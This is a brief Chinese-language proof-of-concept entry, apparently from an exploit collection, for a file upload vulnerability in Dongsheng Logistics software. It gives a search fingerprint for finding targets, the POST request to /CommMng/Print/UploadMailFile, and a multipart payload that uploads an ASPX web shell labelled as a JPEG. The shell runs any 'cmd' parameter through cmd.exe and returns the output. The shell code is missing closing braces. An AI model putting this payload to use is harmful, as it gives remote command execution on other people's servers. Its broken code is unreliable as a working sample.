# 东胜物流UploadMailFile存在文件上传漏洞

- **系统**：东胜物流　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="FeeCodes/CompanysAdapter.aspx"`
- **请求**：`POST /CommMng/Print/UploadMailFile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----Boundary123`

**请求体 / payload**
```
------Boundary123
Content-Disposition: form-data; name="LoadFile"; filename="shell.aspx"
Content-Type: image/jpeg
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
string c = Request["cmd"];
if(c != null){
ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
</script>
------Boundary123--
```
- **预期**：200　|　—